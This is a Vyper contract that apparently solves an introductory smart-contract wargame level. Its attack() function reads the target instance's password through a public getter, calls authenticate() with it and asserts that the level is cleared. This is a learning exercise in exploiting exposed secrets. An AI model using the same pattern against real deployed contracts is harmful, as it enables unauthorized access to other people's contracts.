# @version ^0.3.7

interface InstanceInterface:
    def password() -> String[100]: view
    def getCleared() -> bool: view
    def authenticate(passkey: String[100]): nonpayable

owner: immutable(address)

instance: InstanceInterface

@external
@payable
def __init__(_instance: InstanceInterface):
    owner = msg.sender
    self.instance = _instance
  
@external
def attack():
    assert msg.sender == owner, "!owner"
    passkey: String[100] = self.instance.password()
    self.instance.authenticate(passkey)
    assert self.instance.getCleared(), "!cleared"
